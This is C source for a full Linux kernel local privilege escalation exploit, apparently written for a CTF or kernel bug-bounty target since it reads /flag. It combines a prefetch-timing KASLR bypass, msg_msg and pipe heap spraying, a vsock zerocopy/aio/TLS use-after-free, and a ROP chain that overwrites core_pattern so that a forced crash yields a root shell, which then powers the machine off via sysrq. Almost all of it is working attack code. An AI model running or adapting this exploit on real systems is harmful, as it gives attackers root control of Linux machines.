#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <linux/if_alg.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <linux/tls.h>
#include <linux/vm_sockets.h>
#include <err.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))


#define PAUSE           \
{                   \
        int x;          \
        printf(":");    \
        read(0, &x, 1); \
}

#define SYSCHK(x) ({              \
                typeof(x) __res = (x);        \
                if (__res == (typeof(x))-1)   \
                err(1, "SYSCHK(" #x ")"); \
                __res;                        \
                })


void set_cpu(int i)
{
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(i, &mask);
        sched_setaffinity(0, sizeof(mask), &mask);
}

char buf[1<<16];
const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";


size_t ktext;
// 0xffffffff8245a3c5 : push rdi ; call qword ptr [rdi]
// 0xffffffff81a79ef6 : pop rsp ; jmp 0xffffffff827820a8
#define PUSH_RDI_JMP            (ktext + 0xffffffff8195e2d5UL - 0xffffffff81000000UL) // : push rdi ; jmp qword ptr [rbp + 0x48]
#define POP_RBX_POP_RSP         (ktext + 0xffffffff825c2cf1UL - 0xffffffff81000000UL)    //
#define KNOWN_ADDR              (ktext + 0xffffffff84ca9000UL - 0xffffffff81000000UL)
#define PUSH_RDI_CALL_QRDI      (ktext + 0xffffffff8245a3c5UL - 0xffffffff81000000UL)
#define POP_RSP_RET             (ktext + 0xffffffff81a79ef6UL - 0xffffffff81000000UL)
#define POP_RDI_POP_RBX_RET     (ktext + 0xffffffff81193839UL - 0xffffffff81000000UL)
#define POP_RDI_RET             (ktext + 0xffffffff8100e03bUL - 0xffffffff81000000UL)
#define POP_RSI_RET             (ktext + 0xffffffff8109e035UL - 0xffffffff81000000UL)
#define POP_RDX_RET             (ktext + 0xffffffff8235e04bUL - 0xffffffff81000000UL)
#define MSLEEP                  (ktext + 0xffffffff81271d20UL - 0xffffffff81000000UL)
#define COPY_FROM_USER          (ktext + 0xffffffff81b6ec40UL - 0xffffffff81000000UL)
#define CORE_PATTERN            (ktext + 0xffffffff8420e320UL - 0xffffffff81000000UL)
#define MODULE_SYSFS_OPS        (ktext + 0xffffffff82a2f7f0UL - 0xffffffff81000000UL)

#define PORT 4444

uint64_t stext = 0;
int vsock_bind(unsigned int cid, unsigned int port, int type)
{
        struct sockaddr_vm sa = {
                .svm_family = AF_VSOCK,
                .svm_cid = cid,
                .svm_port = port,
        };

        int fd = SYSCHK(socket(AF_VSOCK, type, 0));
        SYSCHK(bind(fd, (struct sockaddr *)&sa, sizeof(sa)));

        return fd;
}
int vsock_connect_fd(int fd, unsigned int cid, unsigned int port)
{
        struct sockaddr_vm sa = {
                .svm_family = AF_VSOCK,
                .svm_cid = cid,
                .svm_port = port,
        };
        int ret;

        do
        {
                ret = connect(fd, (struct sockaddr *)&sa, sizeof(sa));

        } while (ret < 0 && errno == EINTR);
        printf("connect success\n");

        return ret;
}


int listen_vsockfd = -1;
struct sockaddr_vm listen_vsock_addr;

int vsock_pair(int fd[2]) {
        if(listen_vsockfd == -1) {
                int fd = vsock_bind(VMADDR_CID_ANY, VMADDR_PORT_ANY, SOCK_STREAM);
                printf("fd %d\n", fd);
                SYSCHK(listen(fd,1));
                int alen = sizeof(listen_vsock_addr);
                SYSCHK(getsockname(fd, (struct sockaddr *)&listen_vsock_addr, &alen));
                listen_vsockfd = fd;
        }
        int flag = 1;
        int client = SYSCHK(socket(AF_VSOCK, SOCK_STREAM, 0));
        SYSCHK(setsockopt(client, SOL_SOCKET, SO_ZEROCOPY, &flag, sizeof(flag)));
        vsock_connect_fd(client, listen_vsock_addr.svm_cid, listen_vsock_addr.svm_port);
        int serv = SYSCHK(accept(listen_vsockfd,0,0));
        fd[0] = client;
        fd[1] = serv;
        //SYSCHK(setsockopt(serv, AF_VSOCK, SO_ZEROCOPY, &flag, sizeof(flag)));
}


void DumpHex(const void *data, size_t size)
{
        char ascii[17];
        size_t i, j;
        ascii[16] = '\0';
        for (i = 0; i < size; ++i)
        {
                printf("%02X ", ((unsigned char *)data)[i]);
                if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
                {
                        ascii[i % 16] = ((unsigned char *)data)[i];
                }
                else
                {
                        ascii[i % 16] = '.';
                }
                if ((i + 1) % 8 == 0 || i + 1 == size)
                {
                        printf(" ");
                        if ((i + 1) % 16 == 0)
                        {
                                printf("|  %s \n", ascii);
                        }
                        else if (i + 1 == size)
                        {
                                ascii[(i + 1) % 16] = '\0';
                                if ((i + 1) % 16 <= 8)
                                {
                                        printf(" ");
                                }
                                for (j = (i + 1) % 16; j < 16; ++j)
                                {
                                        printf("   ");
                                }
                                printf("|  %s \n", ascii);
                        }
                }
        }
}

#define PAUSE           \
{                   \
        int x;          \
        printf(":");    \
        read(0, &x, 1); \
}
#define PORT 4444

struct
{
        long mtype;
        char mtext[0x2000];
} msg;

int msqid[0x4000];

int cfd[0x100][0x2];

void setup_tls(int sock)
{
        struct tls12_crypto_info_aes_ccm_128 crypto = {0};
        crypto.info.version = TLS_1_3_VERSION;
        crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;

        // Static dummy keys for demo
        memset(crypto.iv, 0x0, TLS_CIPHER_AES_CCM_128_IV_SIZE);
        memset(crypto.rec_seq, 0x0, TLS_CIPHER_AES_CCM_128_REC_SEQ_SIZE);
        memset(crypto.key, 0x0, TLS_CIPHER_AES_CCM_128_KEY_SIZE);
        memset(crypto.salt, 0x0, TLS_CIPHER_AES_CCM_128_SALT_SIZE);

        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
        {
                perror("setsockopt TCP_ULP");
                exit(1);
        }
        if (setsockopt(sock, SOL_TLS, TLS_TX, &crypto, sizeof(crypto)) < 0)
        {
                perror("setsockopt TLS_TX");
                exit(1);
        }
        if (setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)) < 0)
        {
                perror("setsockopt TLS_RX");
                exit(1);
        }
}
int check_core()
{
        // Check if /proc/sys/kernel/core_pattern has been overwritten
        char buf[0x100] = {};
        int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(core, buf, sizeof(buf));
        close(core);
        return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
        int memfd = memfd_create("", 0);
        SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
        dup2(memfd, 666);
        close(memfd);
        while (check_core() == 0)
                sleep(1);

        puts("Root shell !!");
        /* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
        *(size_t *)0 = 0;
}

char buf2[0x10000];
int sprayfd[0x100][0x2];
int sprayfd2[0x100][0x2];
int pfds[0x1000][2];
char *addrs[0x1000];

int bypass_kaslr(u64 base);
int main(int argc, char **argv)
{
        struct rlimit rlim = {
                .rlim_cur = 0x1000,
                .rlim_max = 0x1000};
        SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));


        if (argc > 1)
        {

                // This section of code will be execute by root!
                int pid = strtoull(argv[1], 0, 10);
                int pfd = syscall(SYS_pidfd_open, pid, 0);
                int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
                int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
                int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
                dup2(stdinfd, 0);
                dup2(stdoutfd, 1);
                dup2(stderrfd, 2);
                /* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
                system("cat /flag");
                system("cat /flag");
                sleep(1);
                system("cat /flag;echo o>/proc/sysrq-trigger");
                exit(0);
        }
        if (fork() == 0) // this process is used to trigger core_pattern exploit
        {
                set_cpu(1);
                setsid();
                crash("");                                                                     }



        ktext = bypass_kaslr(0);
        //ktext = 0xffffffff81000000;


        while(1) {
                if(fork()) {
                        wait(NULL);
                        sleep(5);
                        continue;
                }
                break;
        }

        int listener, conn, client;
        struct sockaddr_in addr = {0};
        int sfd[2];
        //SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,sfd));
        vsock_pair(sfd);
        char* puaf = NULL;

        SYSCHK(syscall(SYS_io_setup, 0x180, (size_t*)&puaf));

        system("ipcrm --all=msg");
        for (int i = 0; i < 0x4000; i++)
        {
                msqid[i] = SYSCHK(msgget(IPC_PRIVATE, 0644 | IPC_CREAT));
        }
        msg.mtype = 1;
        memset(msg.mtext, 'a', 0x2000);

        for (int i = 0; i < 0x600; i++)
        {
                SYSCHK(pipe(pfds[i]));
                SYSCHK(write(pfds[i][1],buf,0x1));
        }

        socklen_t len = sizeof(addr);
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
        set_cpu(0);


        //nperm_rop_payload();

        // === Setup listener ===
        listener = socket(AF_INET, SOCK_STREAM, 0);
        if (listener < 0)
        {
                perror("socket listener");
                exit(1);
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        // inet_pton(AF_INET, "127.0.0.4", &addr.sin_addr);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        int optval = 1;
        SYSCHK(setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)));
        SYSCHK(bind(listener, (struct sockaddr *)&addr, sizeof(addr)));
        SYSCHK(listen(listener, 1));
        client = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));

        SYSCHK(connect(client, (struct sockaddr *)&addr, sizeof(addr)));
        //      SYSCHK(splice(pfds[0][0],0,sfd[0],0,0x6000,0));
        send(sfd[0],puaf+0x1000,0x50c0,MSG_ZEROCOPY);
        SYSCHK(read(sfd[1],buf,0x50c0));
        setup_tls(client);


        int flag = 1;

        printf("[*] Client connected to server\n");

        // === Accept on server side (non-blocking because client already connected) ===
        conn = SYSCHK(accept(listener, NULL, 0));
        printf("[*] Server accepted connection\n");
        //setup_tls(conn);

        // sent immediately
        if (setsockopt(conn, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag)) < 0) {
                perror("setsockopt TCP_NODELAY");
                exit(1);
        }
        socklen_t optlen;
        // --- Get current receive buffer ---
        int rcvbuf;
        optlen = sizeof(rcvbuf);
        if (getsockopt(conn, SOL_SOCKET, SO_RCVBUF, &rcvbuf, &optlen) < 0) {
                perror("getsockopt");
                return 1;
        }
        printf("Default SO_RCVBUF = %d bytes\n", rcvbuf);
        rcvbuf = 1<<16;
        SYSCHK(setsockopt(conn, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)));

        memset(buf,'\xff',sizeof(buf));
        send(conn,buf,5,MSG_OOB);
        for(int i=0;i<0x6;i+=0x1) {
                memset(buf+i*0x1000,'A'+i,0x1000);
                char* p = buf+i*0x1000;
                for(p;p<(buf+(i+1)*0x1000);p+=0xc0) {
                        size_t* rop = (void*)(p+0x20);;
                        memset(p+16,'X',0x8);
                        *(size_t*)(p+16) = MODULE_SYSFS_OPS;
                        *(size_t*)(p+24) = PUSH_RDI_CALL_QRDI;
                        *(size_t*)(p) = POP_RBX_POP_RSP;

                        *rop++ = POP_RDI_RET;
                        *rop++ = CORE_PATTERN;
                        *rop++ = POP_RSI_RET;
                        *rop++ = (size_t)&fake_core_pattern;
                        *rop++ = POP_RDX_RET;
                        *rop++ = 0x30;
                        *rop++ = COPY_FROM_USER;
                        *rop++ = POP_RDI_RET;
                        *rop++ = 0x10000;
                        *rop++ = MSLEEP;

                }
        }
        send(conn,buf,sizeof(buf),0);

        SYSCHK(syscall(SYS_io_destroy, puaf));
        sleep(1);


        int pipe_i = 0;
        for(int i=0;i<0x4000;i++) {
                msgsnd(msqid[i],&msg,0x1000-0x30+0xc0-8,0); // reclaim with kmalloc-192
                                                            // put pipe buffer per slab page
                if((i%21)==0) {
                        fcntl(pfds[pipe_i++][1],F_SETPIPE_SZ,0x4000);
                        fcntl(pfds[pipe_i++][1],F_SETPIPE_SZ,0x4000);
                }
        }

        for(int i=0;i<0x4000;i++) {
                SYSCHK(msgrcv(msqid[i],&msg,0x1000-0x30+0xc0-8,0,IPC_NOWAIT));
        }

        for(int i=0;i<3;i++) {
                printf("%d",i);
                send(conn,buf,5,MSG_OOB);
        }


        for(int i=0;i<0x600;i++) {
                close(pfds[i][0]);
                close(pfds[i][1]);
        }

        return 0;
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
        uint64_t a, d;
        asm volatile ("mfence\n\t"
                        "RDTSCP\n\t"
                        "mov %%rdx, %0\n\t"
                        "mov %%rax, %1\n\t"
                        "xor %%rax, %%rax\n\t"
                        "lfence\n\t"
                        : "=r" (d), "=r" (a)
                        :
                        : "%rax", "%rbx", "%rcx", "%rdx");
        a = (d<<32) | a;
        return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
        uint64_t a, d;
        asm volatile(
                        "xor %%rax, %%rax\n\t"
                        "lfence\n\t"
                        "RDTSCP\n\t"
                        "mov %%rdx, %0\n\t"
                        "mov %%rax, %1\n\t"
                        "mfence\n\t"
                        : "=r" (d), "=r" (a)
                        :
                        : "%rax", "%rbx", "%rcx", "%rdx");
        a = (d<<32) | a;
        return a;
}


void prefetch(void* p)
{
        asm volatile (
                        "prefetchnta (%0)\n"
                        "prefetcht2 (%0)\n"
                        : : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
        size_t time = rdtsc_begin();
        prefetch(addr);
        size_t delta = rdtsc_end() - time;
        return delta;
}

//#define KASLR_BYPASS_INTEL
int bypass_kaslr(u64 base) {
        if (!base) {
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END   (0xffffffffD0000000ull + OFFSET)
#define STEP   0x0000000001000000ull
                while (1) {
                        u64 bases[7] = {0};
                        for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                                size_t times[(END - START) / STEP] = {};
                                uint64_t addrs[(END - START) / STEP];

                                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                                        times[ti] = ~0;
                                        addrs[ti] = START + STEP * (u64)ti;
                                }

                                for (int i = 0; i < 16; i++) {
                                        for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                                                u64 addr = addrs[ti];
                                                size_t t = flushandreload((void*)addr);
                                                if (t < times[ti]) {
                                                        times[ti] = t;
                                                }
                                        }
                                }

                                size_t minv = ~0;
                                size_t mini = -1;
                                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                                        if (times[ti] < minv) {
                                                mini = ti;
                                                minv = times[ti];
                                        }
                                }

                                if (mini < 0) {
                                        return -1;
                                }

                                bases[vote] = addrs[mini];
                        }

                        int c = 0;
                        for (int i = 0; i < ARRAY_LEN(bases); i++) {
                                if (c == 0) {
                                        base = bases[i];
                                } else if (base == bases[i]) {
                                        c++;
                                } else {
                                        c--;
                                }
                        }

                        c = 0;
                        for (int i = 0; i < ARRAY_LEN(bases); i++) {
                                if (base == bases[i]) {
                                        c++;
                                }
                        }
                        if (c > ARRAY_LEN(bases) / 2) {
                                base -= OFFSET;
                                goto got_base;
                        }

                        printf("majority vote failed:\n");
                        printf("base = %llx with %d votes\n", base, c);

                }
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 9
                // largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

                while (1) {
                        u64 bases[NUM_TRIALS] = {0};

                        for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                                size_t times[(END - START) / STEP] = {};
                                uint64_t addrs[(END - START) / STEP];

                                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                                        times[ti] = ~0;
                                        addrs[ti] = START + STEP * (u64)ti;
                                }

                                for (int i = 0; i < 16; i++) {
                                        for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                                                u64 addr = addrs[ti];
                                                size_t t = flushandreload((void*)addr);
                                                if (t < times[ti]) {
                                                        times[ti] = t;
                                                }
                                        }
                                }

                                uint64_t max = 0;
                                int max_i = 0;
                                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
                                        uint64_t sum = 0;
                                        for (int i = 0; i < WINDOW_SIZE; i++) {
                                                sum += times[ti + i];
                                        }
                                        if (sum > max) {
                                                max = sum;
                                                max_i = ti;
                                        }
                                }

                                bases[vote] = addrs[max_i];
                        }

                        int c = 0;
                        for (int i = 0; i < ARRAY_LEN(bases); i++) {
                                if (c == 0) {
                                        base = bases[i];
                                } else if (base == bases[i]) {
                                        c++;
                                } else {
                                        c--;
                                }
                        }

                        c = 0;
                        for (int i = 0; i < ARRAY_LEN(bases); i++) {
                                if (base == bases[i]) {
                                        c++;
                                }
                        }
                        if (c > ARRAY_LEN(bases) / 2) {
                                goto got_base;
                        }

                        printf("majority vote failed:\n");
                        printf("base = %llx with %d votes\n", base, c);
                }
#endif
        }

got_base:

        printf("using kernel base %llx\n", base);


        return base;
}
